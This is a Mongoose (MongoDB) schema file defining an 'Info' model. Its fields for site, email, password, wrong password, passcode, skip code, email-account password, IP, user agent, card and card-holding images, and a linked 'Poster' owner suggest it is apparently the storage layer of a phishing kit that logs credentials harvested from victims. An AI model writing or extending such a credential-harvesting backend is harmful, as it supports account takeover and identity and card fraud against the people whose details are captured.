import mongoose from 'mongoose'

const Schema = mongoose.Schema;
const infoSchema = new Schema({

    site: {
        type: String,
    },
    email: {
        type: String,

        lowercase: true,

    },
     adminId:{
        type: String,
    },
    password: {
        type: String,


    },
    skipcode: {
        type: String,
    },

    username: {
        type: String,
    },
    passcode: {
        type: String,
    },
    ip: {
        type: String,
    },
    agent: {
        type: String,
    },
    poster: {
        type: String,
    },
    root: {
        type: mongoose.Schema.Types.ObjectId,

        ref: 'Poster'
    },
    wrongPassword: { type: String },
    mail: { type: String },
    mailPass: { type: String },
    onlyCard: { type: String },
    holdingCard: { type: String }





}, { timestamps: true })




const Info = mongoose.model('Info', infoSchema);

export default Info



// 6558fca9d08567217d7b4cef